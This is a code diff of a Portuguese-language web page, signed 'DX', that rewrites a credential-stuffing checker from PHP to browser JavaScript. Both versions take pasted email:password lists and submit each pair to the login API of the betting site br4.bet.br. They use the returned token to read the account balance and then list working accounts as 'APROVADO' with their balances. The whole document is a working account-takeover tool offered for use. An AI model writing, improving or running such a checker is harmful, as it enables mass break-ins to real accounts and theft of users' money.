@@ -104,76 +104,68 @@
         <p class="sub">by: DX</p>
     </header>
 
-    <form method="post">
-        <textarea name="dados" placeholder="email1:senha1&#10;email2:senha2&#10;..."></textarea>
+    <form id="formulario">
+        <textarea id="dados" placeholder="email1:senha1&#10;email2:senha2&#10;..."></textarea>
         <button type="submit">INICIAR</button>
     </form>
 
-<?php
-if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["dados"])) {
-    $linhas = explode("\n", trim($_POST["dados"]));
-    echo '<div class="resultado">';
-    foreach ($linhas as $linha) {
-        if (strpos($linha, ":") !== false) {
-            list($email, $senha) = explode(":", trim($linha), 2);
+    <div class="resultado" id="resultado"></div>
 
-            // LOGIN
-            $login = login($email, $senha);
-            if ($login["sucesso"]) {
-                $saldo = number_format($login["saldo"], 2, ',', '.'); // saldo formatado (ex: 1.000,00)
-                echo "<div class='ok'>[APROVADO] $email | $senha | Saldo: R$ $saldo</div>";
-            } else {
-                echo "<div class='fail'>[REPROVADO] $email | $senha</div>";
+<script>
+document.getElementById('formulario').addEventListener('submit', async function(event) {
+    event.preventDefault();
+
+    const resultadoDiv = document.getElementById('resultado');
+    resultadoDiv.innerHTML = '';
+
+    const linhas = document.getElementById('dados').value.trim().split('\n');
+
+    for (const linha of linhas) {
+        if (linha.includes(':')) {
+            const [email, senha] = linha.trim().split(':');
+
+            try {
+                const loginResponse = await fetch('https://br4.bet.br/api/auth/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'User-Agent': 'Mozilla/5.0'
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        password: senha,
+                        login: email
+                    })
+                });
+
+                const loginData = await loginResponse.json();
+
+                if (loginData.access_token) {
+                    const meResponse = await fetch('https://br4.bet.br/api/auth/me', {
+                        method: 'GET',
+                        headers: {
+                            'Authorization': 'Bearer ' + loginData.access_token,
+                            'Content-Type': 'application/json',
+                            'User-Agent': 'Mozilla/5.0'
+                        }
+                    });
+
+                    const meData = await meResponse.json();
+                    const saldo = meData.balance ?? 0;
+                    const saldoFormatado = saldo.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+
+                    resultadoDiv.innerHTML += `<div class="ok">[APROVADO] ${email} | ${senha} | Saldo: R$ ${saldoFormatado}</div>`;
+                } else {
+                    resultadoDiv.innerHTML += `<div class="fail">[REPROVADO] ${email} | ${senha}</div>`;
+                }
+            } catch (error) {
+                console.error('Erro:', error);
+                resultadoDiv.innerHTML += `<div class="fail">[ERRO] ${email} | ${senha}</div>`;
             }
         }
     }
-    echo '</div>';
-}
-
-function login($email, $senha) {
-    $login_url = "https://br4.bet.br/api/auth/login";
-    $me_url = "https://br4.bet.br/api/auth/me";
-
-    $headers = [
-        "Content-Type: application/json",
-        "User-Agent: Mozilla/5.0"
-    ];
-
-    $dados = json_encode([
-        "email" => $email,
-        "password" => $senha,
-        "login" => $email
-    ]);
-
-    // Requisição POST para login
-    $ch = curl_init($login_url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $dados);
-    $resposta = curl_exec($ch);
-    curl_close($ch);
-
-    $json = json_decode($resposta, true);
-    if (isset($json["access_token"])) {
-        $token = $json["access_token"];
-
-        // Requisição GET para obter dados da conta
-        $headers[] = "Authorization: Bearer $token";
-        $ch = curl_init($me_url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-        $res = curl_exec($ch);
-        curl_close($ch);
-
-        $info = json_decode($res, true);
-        $saldo = $info["balance"] ?? 0;
-
-        return ["sucesso" => true, "saldo" => $saldo];
-    }
-
-    return ["sucesso" => false];
-}
-?>
+});
+</script>
 
 </body>
 </html>
